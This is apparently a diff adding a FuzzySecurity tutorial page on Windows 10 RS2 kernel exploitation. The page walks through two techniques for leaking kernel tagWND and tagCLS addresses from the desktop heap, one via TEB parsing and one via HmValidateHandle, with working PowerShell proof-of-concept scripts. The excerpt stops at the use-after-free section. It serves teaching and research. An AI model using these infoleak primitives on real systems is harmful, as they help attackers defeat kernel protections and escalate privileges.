@@ -1,0 +1,959 @@
+<!DOCTYPE html>
+<!--[if lt IE 7 ]><html class="ie ie6" lang="en"> <![endif]-->
+<!--[if IE 7 ]><html class="ie ie7" lang="en"> <![endif]-->
+<!--[if IE 8 ]><html class="ie ie8" lang="en"> <![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!--><html lang="en"> <!--<![endif]-->
+<head>
+
+  <!-- Basic Page Needs -->
+  <meta charset="utf-8">
+  <title>FuzzySecurity | Windows ExploitDev: Part 18</title>
+  <meta name="description" content="">
+  <meta name="author" content="">
+
+  <!-- CSS Style -->
+  <link rel="stylesheet" href="../../css/style.css"> 
+  
+  <!-- Color Skins -->
+  <link rel="stylesheet" href="../../css/skins/red.css" name="skins"> 
+  
+  <!-- Layout Style -->
+  <link rel="stylesheet" href="../../css/layout/wide.css" name="layout"> 
+  
+  <!-- Small Icons -->
+  <link rel="stylesheet" href="../../css/icons.css">  
+  
+  <!-- SyntaxHighlighter -->
+  <link type="text/css" rel="stylesheet" href="../../css/shCoreEmacs.css"/>
+  
+  <!-- Start JavaScript -->
+  
+    <script src="../../js/jquery-1.7.2.min.js"></script> <!-- jQuery library -->
+    <script src="../../js/jquery.easing.1.3.min.js"></script> <!-- jQuery Easing --> 
+    <script src="../../js/jquery-ui.min.js"></script> <!-- jQuery Ui --> 
+    <script src="../../js/jquery.cookie.js"></script> <!-- jQuery cookie --> 
+    <script src="../../js/jquery.uniform.min.js"></script> <!-- jQuery Uniform -->
+    <script src="../../js/ddsmoothmenu.js"></script> <!-- Nav Menu ddsmoothmenu -->
+    <script src="../../js/jquery.flexslider.js"></script> <!-- Flex Slider  -->
+    <script src="../../js/jquery.eislideshow.js"></script> <!-- Elastic Slider  -->
+    <script src="../../js/jquery.iconmenu.js"></script> <!-- Sliding Text and Icon Menu Style  -->
+    <script src="../../js/colortip.js"></script> <!-- Colortip Tooltip Plugin  -->
+    <script src="../../js/tytabs.js"></script> <!-- jQuery Plugin tytabs  -->
+    <script src="../../js/carousel.js"></script> <!-- jQuery Carousel  -->
+    <script src="../../js/jquery.prettyPhoto.js"></script> <!-- jQuery Prettyphoto  -->
+    <script src="../../js/jquery.isotope.min.js"></script> <!-- Isotope Filtering  -->
+    <script src="../../js/selectnav.js"></script> <!-- Responsive Navigation Menu by SelectNav -->
+    <script src="../../js/jquery.ui.totop.js"></script> <!-- UItoTop plugin  -->
+    <script src="../../js/custom.js"></script> <!-- Custom Js file for javascript in html -->
+    
+    <!-- SyntaxHighlighter -->
+	<script type="text/javascript" src="../../js/shCore.js"></script>
+	<script type="text/javascript" src="../../js/shBrushCpp.js"></script>
+	<script type="text/javascript" src="../../js/shBrushPowerShell.js"></script>
+    <script type="text/javascript">SyntaxHighlighter.all();</script>
+  
+  <!-- End JavaScript -->
+
+  <!--[if lt IE 9]>
+      <script src="js/html5.js"></script>
+  <![endif]-->
+
+  <!-- Favicons -->
+  <link rel="shortcut icon" href="../../images/favicon/favicon.ico">
+  <link rel="apple-touch-icon" href="../../images/favicon/apple-touch-icon.png">
+  <link rel="apple-touch-icon" sizes="72x72" href="../../images/favicon/apple-touch-icon-72x72.png">
+  <link rel="apple-touch-icon" sizes="114x114" href="../../images/favicon/apple-touch-icon-114x114.png">
+
+</head>
+<body>
+
+  <div id="wrap" class="boxed">
+
+  <header>
+    <div class="container clearfix">
+    
+      <div class="five columns">
+        <div class="logo">
+        <a href="index.html">
+          <img src="../../images/logo.png" alt="FuzzySec" />
+        </a>
+        </div>
+      </div><!-- End Logo -->
+      
+      <div class="eleven columns">
+        <nav id="menu" class="navigation">
+          <ul id="nav">
+            <li><a href="../../index.html">Home</a>
+            </li>
+            <li><a href="../../tutorials.html" class="active">Tutorials</a>
+            </li>
+            <li><a href="../../coding.html">Scripting</a>
+            </li>
+            <li><a href="../../exploits.html">Exploits</a>
+            </li>
+            <li><a href="../../links.html">Links</a>
+            </li>
+            <li><a href="../../patreon.html">Patreon</a></li><li><a href="../../contact.html">Contact</a></li>
+          </ul> 
+        </nav>
+      </div><!-- End Menu -->
+      
+      
+      <div class="sixteen columns"><hr /></div>
+      
+    </div><!-- End Container -->
+  </header><!-- <<< End Header >>> -->
+  
+  <div class="container clearfix">
+  
+    <div class="page-columns">
+    
+    <ul class="breadcrumbs">
+      <li><a href="index.html"><span class="icon home gray"></span></a></li>
+          <li><a href="../../index.html">Home</a> <b>&#187;</b></li>
+          <li><a href="../../tutorials.html">Tutorials</a> <b>&#187;</b></li>
+          <li>Kernel Exploitation: RS2 Bitmap Necromancy</li>
+      </ul>
+      
+      <!-- section 16 Columns -->
+      
+      <div class="recent-work gallery clearfix">
+      <div class="eighteen columns bottom">
+	<div style="height:20px;" align="right">
+		<link type="text/css" rel="stylesheet" href="https://www.fuzzysecurity.com/css/patreon.css"/>
+		<button class="btn btn-2 btn-2g"><a href="https://www.patreon.com/FuzzySec" target="_blank"><img src="https://c5.patreon.com/external/logo/become_a_patron_button.png" style="border-radius: 10px;height:40px;"></a></button>
+	</div>
+        <h2 class="title">Part 18: Kernel Exploitation -> RS2 Bitmap Necromancy<span class="line"></span></h2>
+        <p>Hello and welcome back to another installment of the Windows Kernel exploitation series! It has been a while since my last post due to a lack of free time, I have however been putting out and refining a good amount of code in my <a href="https://github.com/FuzzySecurity/PSKernel-Primitives">PSKernel-Primitives</a> repo so please keep an eye on that if you are interested in PowerShell Kernel pwn.<br /><br />
+
+Today we will be resurrecting our, much loved, Bitmap kernel primitive on Windows 10 RS2. We are skipping RS1 as I wrote a blogpost for <a href="https://twitter.com/mwrlabs">@mwrlabs</a> detailing how to bypass the new mitigations present in the anniversary edition <a href="https://labs.mwrinfosecurity.com/blog/a-tale-of-bitmaps/">here</a>.<br /><br />
+
+We will go through two different techniques to leak Window objects from the desktop heap and then, using those objects, leak Bitmaps. I strongly recommend that you consult the resources below for more background information. Anyway, enough jibber jabber, let's get to it!<br /><br />
+      
+      <span style="color: #ffffff;"><strong>Resources:</strong></span><br />
+		+ Win32k Dark Composition: Attacking the Shadow part of Graphic subsystem (Peng Qui & SheFang Zhong => 360Vulcan) - <a href="https://www.slideshare.net/CanSecWest/csw2017-peng-qiushefangzhong-win32k-darkcompositionfinnalfinnalrmmark">here</a><br />
+		+ LPE vulnerabilities exploitation on Windows 10 Anniversary Update (Drozdov Yurii & Drozdova Liudmila) - <a href="http://cvr-data.blogspot.co.uk/2016/11/lpe-vulnerabilities-exploitation-on.html">here</a><br />
+		+ Morten Schenk's tweet revealing the first technique :D (<a href="https://twitter.com/Blomster81">@Blomster81</a>) - <a href="https://twitter.com/Blomster81/status/844544024224710656">here</a><br />
+		+ Abusing GDI for ring0 exploit primitives: reloaded (<a href="https://twitter.com/NicoEconomou">@NicoEconomou</a> & Diego Juarez) - <a href="https://www.coresecurity.com/system/files/publications/2016/10/Abusing-GDI-Reloaded-ekoparty-2016_0.pdf">here</a><br />
+		+ A Tale Of Bitmaps: Leaking GDI Objects Post Windows 10 Anniversary Edition (<a href="">@FuzzySec</a>) - <a href="https://labs.mwrinfosecurity.com/blog/a-tale-of-bitmaps/">here</a><br />
+		+ PSKernel-Primitives (<a href="">@FuzzySec</a>) - <a href="https://github.com/FuzzySecurity/PSKernel-Primitives/blob/master/Stage-HmValidateHandleBitmap.ps1">here</a><br />
+		+ Windows RS2 HmValidateHandle Write-What-Where (<a href="">@FuzzySec</a>) - <a href="https://github.com/FuzzySecurity/HackSysTeam-PSKernelPwn/blob/master/Kernel_RS2_WWW_GDI_64.ps1">here</a><br /></p><br />
+	  
+<div class="fourteen columns bottom">
+<h2 class="title">Plugging leaks<span class="line"></span></h2>
+<p>We would do well to briefly list the the mitigations Microsoft implemented to prevent Bitmap leaks and how these were bypassed for each iteration. The major build versions are used below for reference.<br /><br />
+
+<span style="color: #ffffff;"><strong>Windows 10 v1511</strong></span><br /><br />
++ No mitigation in place at this point.<br />
++ To leak, we grabbed a handle to the GdiSharedHandleTable from the PEB, performed a lookup to find the correct GDI_CELL struct and then read out the pKernelAddress which disclosed the Kernel address of the Bitmap SURFOBJ. Sample code can be found <a href="https://github.com/FuzzySecurity/PSKernel-Primitives/blob/master/Stage-BitmapReadWrite.ps1">here</a>.<br /><br />
+
+<span style="color: #ffffff;"><strong>Windows 10 RS1 v1607</strong></span><br /><br />
++ Microsoft nulled the pKernelAddress in the GDI_CELL struct killing the old infoleak.<br />
++ It was found that a number of objects, located in the same pool as our coveted Bitmap (paged pool), could be leaked. This was achieved by getting the address of gSharedInfo (global variable) from user32, reading out the address of the aheList HANDLEENTRY array, finding the correct array entry and finally reading out the phead element to get the kernel address of the object. Though we could not get the address of our bitmap directly, it was possible to craft/leak objects with a large size (ensuring the would end up in a low entropy large pool) and then perform a UAF style attack where the original object was free'd and the Bitmap allocated in it's place. Sample code can be found <a href="https://github.com/FuzzySecurity/PSKernel-Primitives/blob/master/Stage-gSharedInfoBitmap.ps1">here</a>.<br /><br />
+
+<span style="color: #ffffff;"><strong>Windows 10 RS2 v1703</strong></span><br /><br />
++ Wouldn't you know it, Microsoft nulled the phead pointer killing the leak.<br />
++ In this post we will discuss how we can use the user mapped Desktop heap to leak Window objects and, similar to what we did before, perform a UAF style attack to regain our Bitmap primitive!</p>
+
+<p>&nbsp;</p>
+<center><img src="images/RS2-Desktop1.jpg"></center>
+<p>&nbsp;</p>
+
+<h2 class="title">Leak 1 => TEB.Win32ClientInfo<span class="line"></span></h2>
+<p>The first thing we want to do is leak the Kernel addresses for the tagWND and tagCLS Window structures. We will start off with Morten's leak as it provides better background to understanding the second leak.<br /><br />
+
+The tweet below gives us all the detail we need to leak the address of the user mapped Desktop heap and how to calculate the offset from the user-mode version to the kernel-mode version (ulClientDelta).</p>
+
+<p>&nbsp;</p>
+<center><img src="images/RS2-Desktop2.jpg"></center>
+<p>&nbsp;</p>
+
+<p>It seems like the pointer to the user-mode version is stored at TEB.Win32ClientInfo+0x28 and the pointer to the kernel-mode version is stored at a further 0x28 from that address. The client delta in turn is simply the kernel address minus the user address. We can easily script something up in PowerShell which pulls out this data for us.</p>
+
+    <div class="main_wrap_support">
+<pre class="brush: powershell;gutter:false;auto-links: false;;">
+Add-Type -TypeDefinition @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+
+[StructLayout(LayoutKind.Sequential)]
+public struct _THREAD_BASIC_INFORMATION
+{
+	public IntPtr ExitStatus;
+	public IntPtr TebBaseAddress;
+	public IntPtr ClientId;
+	public IntPtr AffinityMask;
+	public IntPtr Priority;
+	public IntPtr BasePriority;
+}
+
+public static class TEB
+{
+	[DllImport("ntdll.dll")]
+	public static extern int NtQueryInformationThread(
+		IntPtr hThread, 
+		int ThreadInfoClass,
+		ref _THREAD_BASIC_INFORMATION ThreadInfo,
+		int ThreadInfoLength,
+		ref int ReturnLength);
+
+	[DllImport("kernel32.dll")]
+	public static extern IntPtr GetCurrentThread();
+}
+"@
+
+# Pseudo handle => -2
+$CurrentHandle = [TEB]::GetCurrentThread()
+
+# ThreadBasicInformation
+$THREAD_BASIC_INFORMATION = New-Object _THREAD_BASIC_INFORMATION
+$THREAD_BASIC_INFORMATION_SIZE = [System.Runtime.InteropServices.Marshal]::SizeOf($THREAD_BASIC_INFORMATION)
+
+$RetLen = New-Object Int
+$CallResult = [TEB]::NtQueryInformationThread($CurrentHandle,0,[ref]$THREAD_BASIC_INFORMATION,$THREAD_BASIC_INFORMATION_SIZE,[ref]$RetLen)
+
+$TEBBase = $THREAD_BASIC_INFORMATION.TebBaseAddress
+$TEB_Win32ClientInfo = [Int64]$TEBBase+0x800
+$TEB_UserKernelDesktopHeap = [System.Runtime.InteropServices.Marshal]::ReadInt64([Int64]$TEBBase+0x828)
+$TEB_KernelDesktopHeap = [System.Runtime.InteropServices.Marshal]::ReadInt64($TEB_UserKernelDesktopHeap+0x28)
+
+echo "`n[+] _TEB.Win32ClientInfo:     $('{0:X16}' -f $TEB_Win32ClientInfo)"
+echo "[+] User Mapped Desktop Heap: $('{0:X16}' -f $TEB_UserKernelDesktopHeap)"
+echo "[+] Kernel Desktop Heap:      $('{0:X16}' -f $TEB_KernelDesktopHeap)"
+echo "[+] ulClientDelta:            $('{0:X16}' -f ($TEB_KernelDesktopHeap-$TEB_UserKernelDesktopHeap))`n"</pre>
+</div>
+
+<p>Running our POC give the following output.</p>
+
+<p>&nbsp;</p>
+<img src="images/RS2-Desktop3.jpg">
+<p>&nbsp;</p>
+
+<p>We can briefly confirm these values in KD.</p>
+
+<p>&nbsp;</p>
+<img src="images/RS2-Desktop4.jpg">
+<p>&nbsp;</p>
+
+<p>An analysis of the desktop heap is beyond the scope of this post, for further information you can have a look <a href="https://blogs.msdn.microsoft.com/ntdebugging/2007/01/04/desktop-heap-overview/">here</a>.</p><br /><br />
+
+<p><span style="color: #ffffff;"><strong>Scanning the Desktop Heap</strong></span><br /><br />
+Cool, the next step is to create a Window object and scan the Desktop Heap to find it. Since Microsoft decided (after Windows 8) that people don't need symbols for tagWND & tagCLS (..sigh..) we will have a quick look at these structures on Windows 7.</p>
+
+<p>&nbsp;</p>
+<img src="images/RS2-Desktop5.jpg">
+<p>&nbsp;</p>
+
+<p>As we can see, the first IntPtr sized value of tagWND is the Window handle (returned by CreateWindow/Ex). Notice also that tagWND->THRDESKHEAD->pSelf is a pointer to tagWND in the Kernel and that we can actually calculate the ulClientDelta by subtracting the Kernel tagWND from the user tagWND. One final thing to note is that the tagWND & tagCLS structures were changed in Windows 10 RS2. A bit of light reversing showed the following relevant offset changes.<br /><br />
+
+<span style="color: #ffffff;"><strong>x64 Pre RS2 (15063)</strong></span><br />
++ Window handle => 0x0<br />
++ pSelf => 0x20<br />
++ pcls => 0x98<br />
++ lpszMenuNameOffset => pcls + 0x88<br /><br />
+
+<span style="color: #ffffff;"><strong>x64 Post RS2 (15063)</strong></span><br />
++ Window handle => 0x0<br />
++ pSelf => 0x20<br />
++ pcls => 0xa8<br />
++ lpszMenuNameOffset => pcls + 0x90<br /><br />
+</p>
+
+<p>Finding the a Window on the Desktop Heap is pretty straight forward, starting at the base of the Desktop Heap we can read out IntPtr sized values and compare them to a specific Window handle. Once we find a match we know we have the offset to the start of the tagWND struct. Let's update our POC and give that a go.</p>
+
+    <div class="main_wrap_support">
+<pre class="brush: powershell;gutter:false;auto-links: false;;">
+Add-Type -TypeDefinition @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+
+[StructLayout(LayoutKind.Sequential)]
+public struct _THREAD_BASIC_INFORMATION
+{
+	public IntPtr ExitStatus;
+	public IntPtr TebBaseAddress;
+	public IntPtr ClientId;
+	public IntPtr AffinityMask;
+	public IntPtr Priority;
+	public IntPtr BasePriority;
+}
+
+public class DesktopHeapGDI
+{	
+	delegate IntPtr WndProc(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam);
+
+	[System.Runtime.InteropServices.StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)]
+	struct WNDCLASS
+	{
+		public uint style;
+		public IntPtr lpfnWndProc;
+		public int cbClsExtra;
+		public int cbWndExtra;
+		public IntPtr hInstance;
+		public IntPtr hIcon;
+		public IntPtr hCursor;
+		public IntPtr hbrBackground;
+		[MarshalAs(UnmanagedType.LPWStr)]
+		public string lpszMenuName;
+		[MarshalAs(UnmanagedType.LPWStr)]
+		public string lpszClassName;
+	}
+	
+	[System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)]
+	static extern System.UInt16 RegisterClassW(
+		[System.Runtime.InteropServices.In] ref WNDCLASS lpWndClass
+	);
+
+	[System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)]
+	static extern IntPtr CreateWindowExW(
+		UInt32 dwExStyle,
+		[MarshalAs(UnmanagedType.LPWStr)]
+		string lpClassName,
+		[MarshalAs(UnmanagedType.LPWStr)]
+		string lpWindowName,
+		UInt32 dwStyle,
+		Int32 x,
+		Int32 y,
+		Int32 nWidth,
+		Int32 nHeight,
+		IntPtr hWndParent,
+		IntPtr hMenu,
+		IntPtr hInstance,
+		IntPtr lpParam
+	);
+
+	[System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)]
+	static extern System.IntPtr DefWindowProcW(
+		IntPtr hWnd,
+		uint msg,
+		IntPtr wParam,
+		IntPtr lParam
+	);
+
+	[System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)]
+	static extern bool DestroyWindow(
+		IntPtr hWnd
+	);
+
+	[DllImport("ntdll.dll")]
+	public static extern int NtQueryInformationThread(
+		IntPtr hThread, 
+		int ThreadInfoClass,
+		ref _THREAD_BASIC_INFORMATION ThreadInfo,
+		int ThreadInfoLength,
+		ref int ReturnLength);
+
+	[DllImport("kernel32.dll")]
+	public static extern IntPtr GetCurrentThread();
+
+	[DllImport("kernel32.dll", SetLastError = true)]
+	public static extern void DebugBreak();
+
+	private IntPtr m_hwnd;
+	public IntPtr CustomWindow(string class_name, string menu_name)
+	{
+		m_wnd_proc_delegate = CustomWndProc;
+
+		WNDCLASS wind_class = new WNDCLASS();
+		wind_class.lpszClassName = class_name;
+		wind_class.lpszMenuName = menu_name;
+		wind_class.lpfnWndProc = System.Runtime.InteropServices.Marshal.GetFunctionPointerForDelegate(m_wnd_proc_delegate);
+
+		UInt16 class_atom = RegisterClassW(ref wind_class);
+		m_hwnd = CreateWindowExW(
+			0,
+			class_name,
+			String.Empty,
+			0,
+			0,
+			0,
+			0,
+			0,
+			IntPtr.Zero,
+			IntPtr.Zero,
+			IntPtr.Zero,
+			IntPtr.Zero
+		);
+		return m_hwnd;
+	}
+
+	private static IntPtr CustomWndProc(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam)
+	{
+		return DefWindowProcW(hWnd, msg, wParam, lParam);
+	}
+
+	private WndProc m_wnd_proc_delegate;
+}
+"@
+
+
+#------------------[Create Window]
+
+# Call nonstatic public method => delegWndProc
+$DesktopHeapGDI = New-Object DesktopHeapGDI
+
+# Menu name buffer
+$Buff = "A"*0x8F0
+$Handle = $DesktopHeapGDI.CustomWindow("TestWindow",$Buff)
+#$Handle.ToInt64()
+echo "`n[+] Window handle: $Handle"
+
+#------------------[Leak Desktop Heap]
+
+# Pseudo handle => -2
+$CurrentHandle = [DesktopHeapGDI]::GetCurrentThread()
+
+# ThreadBasicInformation
+$THREAD_BASIC_INFORMATION = New-Object _THREAD_BASIC_INFORMATION
+$THREAD_BASIC_INFORMATION_SIZE = [System.Runtime.InteropServices.Marshal]::SizeOf($THREAD_BASIC_INFORMATION)
+
+$RetLen = New-Object Int
+$CallResult = [DesktopHeapGDI]::NtQueryInformationThread($CurrentHandle,0,[ref]$THREAD_BASIC_INFORMATION,$THREAD_BASIC_INFORMATION_SIZE,[ref]$RetLen)
+
+$TEBBase = $THREAD_BASIC_INFORMATION.TebBaseAddress
+$TEB_Win32ClientInfo = [Int64]$TEBBase+0x800
+$TEB_UserKernelDesktopHeap = [System.Runtime.InteropServices.Marshal]::ReadInt64([Int64]$TEBBase+0x828)
+$TEB_KernelDesktopHeap = [System.Runtime.InteropServices.Marshal]::ReadInt64($TEB_UserKernelDesktopHeap+0x28)
+$ulClientDelta = $TEB_KernelDesktopHeap - $TEB_UserKernelDesktopHeap
+
+echo "`n[+] _TEB.Win32ClientInfo:     $('{0:X16}' -f $TEB_Win32ClientInfo)"
+echo "[+] User Mapped Desktop Heap: $('{0:X16}' -f $TEB_UserKernelDesktopHeap)"
+echo "[+] Kernel Desktop Heap:      $('{0:X16}' -f $TEB_KernelDesktopHeap)"
+echo "[+] ulClientDelta:            $('{0:X16}' -f $ulClientDelta)"
+
+#------------------[Parse User Desktop Heap]
+
+echo "`n[+] Parsing Desktop heap.."
+for ($i=0;$i -lt 0xFFFFF;$i=$i+8) {
+	$ReadHandle = [System.Runtime.InteropServices.Marshal]::ReadInt64($TEB_UserKernelDesktopHeap + $i)
+	if ($ReadHandle -eq $Handle.ToInt64()) {
+		echo "[!] w00t, found handle!"
+		$UsertagWND = $TEB_UserKernelDesktopHeap + $i
+		$KerneltagCLS = [System.Runtime.InteropServices.Marshal]::ReadInt64($UsertagWND + 0xa8)
+		break
+	}
+}
+
+echo "`n[+] User tagWND: $('{0:X16}' -f $($UsertagWND))"
+echo "[+] User tagCLS: $('{0:X16}' -f $($KerneltagCLS-$ulClientDelta))"
+echo "[+] Kernel tagWND: $('{0:X16}' -f $($UsertagWND+$ulClientDelta))"
+echo "[+] Kernel tagCLS: $('{0:X16}' -f $($KerneltagCLS))"
+echo "[+] Kernel tagCLS.lpszMenuName: $('{0:X16}' -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($KerneltagCLS-$ulClientDelta+0x90)))`n"
+
+#------------------[Break]
+Start-Sleep -s 20
+[DesktopHeapGDI]::DebugBreak()</pre>
+</div>
+
+<p>There is no overhead doing this type of read operation, we immediately get the following results back. Notice the PowerShell prompt has not returned, this is because we need to break before the script exits.</p>
+
+<p>&nbsp;</p>
+<img src="images/RS2-Desktop6.jpg">
+<p>&nbsp;</p>
+
+<p>Some quick dq/db's in KD show that we successfully calculated all the relevant offsets.</p>
+
+<p>&nbsp;</p>
+<img src="images/RS2-Desktop7.jpg">
+
+<h2 class="title">Leak 2 => User32::HmValidateHandle<span class="line"></span></h2>
+
+<p>The use of HmValidateHandle was first discussed by <a href="https://twitter.com/kernelpool">@kernelpool</a> in his 2011 paper <a href="https://media.blackhat.com/bh-us-11/Mandt/BH_US_11_Mandt_win32k_WP.pdf">Kernel Attacks through User-Mode Callbacks</a> and has later been used in a number of exploits including CVE-2016-7255 <a href="http://blog.trendmicro.com/trendlabs-security-intelligence/one-bit-rule-system-analyzing-cve-2016-7255-exploit-wild/">as exploited by Fancy Bear</a>.<br /><br />
+
+HmValidateHandle is a very interesting function as we can provide it with a handle to a Window object and it will return the pointer to the user mapped tagWND object on the Desktop Heap, isn't that useful! This way we can get round the whole TEB parsing and brute-forcing. The only issue is that HmValidateHandle is not exported by User32 so we need to do some tricks to get it's address and then cast a delegate.<br /><br />
+
+From a lot of public accounts we gather that HmValidateHandle is close to the exported User32::IsMenu function, let's have a look at that in KD.</p>
+
+<p>&nbsp;</p>
+<img src="images/RS2-Desktop8.jpg">
+<p>&nbsp;</p>
+
+<p>Nice an painless indeed! All we need to do is get the run-time address of User32::IsMenu, look for the first occurence of 0xE8 (call ...) and cast the pointer as a delegate. We can use the following PowerShell code snippet to do this.</p>
+
+    <div class="main_wrap_support">
+<pre class="brush: powershell;gutter:false;auto-links: false;;">
+Add-Type -TypeDefinition @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+
+public class HmValidateHandleBitmap
+{
+	delegate IntPtr WndProc(
+		IntPtr hWnd,
+		uint msg,
+		IntPtr wParam,
+		IntPtr lParam);
+
+	[StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)]
+	struct WNDCLASS
+	{
+		public uint style;
+		public IntPtr lpfnWndProc;
+		public int cbClsExtra;
+		public int cbWndExtra;
+		public IntPtr hInstance;
+		public IntPtr hIcon;
+		public IntPtr hCursor;
+		public IntPtr hbrBackground;
+		[MarshalAs(UnmanagedType.LPWStr)]
+		public string lpszMenuName;
+		[MarshalAs(UnmanagedType.LPWStr)]
+		public string lpszClassName;
+	}
+
+	[DllImport("user32.dll")]
+	static extern System.UInt16 RegisterClassW(
+		[In] ref WNDCLASS lpWndClass);
+
+	[DllImport("user32.dll")]
+	public static extern IntPtr CreateWindowExW(
+		UInt32 dwExStyle,
+		[MarshalAs(UnmanagedType.LPWStr)]
+		string lpClassName,
+		[MarshalAs(UnmanagedType.LPWStr)]
+		string lpWindowName,
+		UInt32 dwStyle,
+		Int32 x,
+		Int32 y,
+		Int32 nWidth,
+		Int32 nHeight,
+		IntPtr hWndParent,
+		IntPtr hMenu,
+		IntPtr hInstance,
+		IntPtr lpParam);
+
+	[DllImport("user32.dll")]
+	static extern System.IntPtr DefWindowProcW(
+		IntPtr hWnd,
+		uint msg,
+		IntPtr wParam,
+		IntPtr lParam);
+
+	[DllImport("user32.dll")]
+	public static extern bool DestroyWindow(
+		IntPtr hWnd);
+
+	[DllImport("user32.dll")]
+	public static extern bool UnregisterClass(
+		String lpClassName,
+		IntPtr hInstance);
+
+	[DllImport("kernel32",CharSet=CharSet.Ansi)]
+	public static extern IntPtr LoadLibrary(
+		string lpFileName);
+
+	[DllImport("kernel32",CharSet=CharSet.Ansi,ExactSpelling=true)]
+	public static extern IntPtr GetProcAddress(
+		IntPtr hModule,
+		string procName);
+
+	public delegate IntPtr HMValidateHandle(
+		IntPtr hObject,
+		int Type);
+
+	[DllImport("gdi32.dll")]
+	public static extern IntPtr CreateBitmap(
+		int nWidth,
+		int nHeight,
+		uint cPlanes,
+		uint cBitsPerPel,
+		IntPtr lpvBits);
+
+	public UInt16 CustomClass(string class_name, string menu_name)
+	{
+		m_wnd_proc_delegate = CustomWndProc;
+		WNDCLASS wind_class = new WNDCLASS();
+		wind_class.lpszClassName = class_name;
+		wind_class.lpszMenuName = menu_name;
+		wind_class.lpfnWndProc = System.Runtime.InteropServices.Marshal.GetFunctionPointerForDelegate(m_wnd_proc_delegate);
+		return RegisterClassW(ref wind_class);
+	}
+
+	private static IntPtr CustomWndProc(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam)
+	{
+		return DefWindowProcW(hWnd, msg, wParam, lParam);
+	}
+
+	private WndProc m_wnd_proc_delegate;
+}
+"@
+
+#------------------[Create/Destroy Window]
+# Call nonstatic public method => delegWndProc
+$AtomCreate = New-Object HmValidateHandleBitmap
+
+function Create-WindowObject {
+	$MenuBuff = "A"*0x8F0
+	$hAtom = $AtomCreate.CustomClass("BitmapStager",$MenuBuff)
+	[HmValidateHandleBitmap]::CreateWindowExW(0,"BitmapStager",[String]::Empty,0,0,0,0,0,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero)
+}
+
+function Destroy-WindowObject {
+	param ($Handle)
+	$CallResult = [HmValidateHandleBitmap]::DestroyWindow($Handle)
+	$CallResult = [HmValidateHandleBitmap]::UnregisterClass("BitmapStager",[IntPtr]::Zero)
+}
+
+#------------------[Cast HMValidateHandle]
+function Cast-HMValidateHandle {
+	$hUser32 = [HmValidateHandleBitmap]::LoadLibrary("user32.dll")
+	$lpIsMenu = [HmValidateHandleBitmap]::GetProcAddress($hUser32, "IsMenu")
+	
+	# Get HMValidateHandle pointer
+	for ($i=0;$i-lt50;$i++) {
+		if ($([System.Runtime.InteropServices.Marshal]::ReadByte($lpIsMenu.ToInt64()+$i)) -eq 0xe8) {
+			$HMValidateHandleOffset = [System.Runtime.InteropServices.Marshal]::ReadInt32($lpIsMenu.ToInt64()+$i+1)
+			[IntPtr]$lpHMValidateHandle = $lpIsMenu.ToInt64() + $i + 5 + $HMValidateHandleOffset
+		}
+	}
+
+	if ($lpHMValidateHandle) {
+		# Cast IntPtr to delegate
+		[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($lpHMValidateHandle,[HmValidateHandleBitmap+HMValidateHandle])
+	}
+}
+
+#------------------[Window Leak]
+function Leak-lpszMenuName {
+	param($WindowHandle)
+	$OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version
+	$OSMajorMinor = "$($OSVersion.Major).$($OSVersion.Minor)"
+	if ($OSMajorMinor -eq "10.0" -And $OSVersion.Build -ge 15063) {
+		$pCLSOffset = 0xa8
+		$lpszMenuNameOffset = 0x90
+	} else {
+		$pCLSOffset = 0x98
+		$lpszMenuNameOffset = 0x88
+	}
+
+	# Cast HMValidateHandle & get window desktop heap pointer
+	$HMValidateHandle = Cast-HMValidateHandle
+	$lpUserDesktopHeapWindow = $HMValidateHandle.Invoke($WindowHandle,1)
+
+	# Calculate all the things
+	$ulClientDelta = [System.Runtime.InteropServices.Marshal]::ReadInt64($lpUserDesktopHeapWindow.ToInt64()+0x20) - $lpUserDesktopHeapWindow.ToInt64()
+	$KerneltagCLS = [System.Runtime.InteropServices.Marshal]::ReadInt64($lpUserDesktopHeapWindow.ToInt64()+$pCLSOffset)
+	$lpszMenuName = [System.Runtime.InteropServices.Marshal]::ReadInt64($KerneltagCLS-$ulClientDelta+$lpszMenuNameOffset)
+
+	echo "`n[+] ulClientDelta:              $('{0:X16}' -f $ulClientDelta)"
+	echo "[+] User tagWND:                $('{0:X16}' -f $($lpUserDesktopHeapWindow.ToInt64()))"
+	echo "[+] User tagCLS:                $('{0:X16}' -f $($KerneltagCLS-$ulClientDelta))"
+	echo "[+] Kernel tagWND:              $('{0:X16}' -f $($lpUserDesktopHeapWindow.ToInt64()+$ulClientDelta))"
+	echo "[+] Kernel tagCLS:              $('{0:X16}' -f $($KerneltagCLS))"
+	echo "[+] Kernel tagCLS.lpszMenuName: $('{0:X16}' -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($KerneltagCLS-$ulClientDelta+0x90)))`n"
+}
+
+$hWindow = Create-WindowObject
+echo "`n[+] Window handle: $hWindow"
+Leak-lpszMenuName -WindowHandle $hWindow</pre>
+</div>
+
+<p>Running the POC above essentially gives us the same result as the first leak but with less steps!</p>
+
+<p>&nbsp;</p>
+<img src="images/RS2-Desktop9.jpg">
+<p>&nbsp;</p>
+
+<h2 class="title">Use-After-Free Bitmap<span class="line"></span></h2>
+
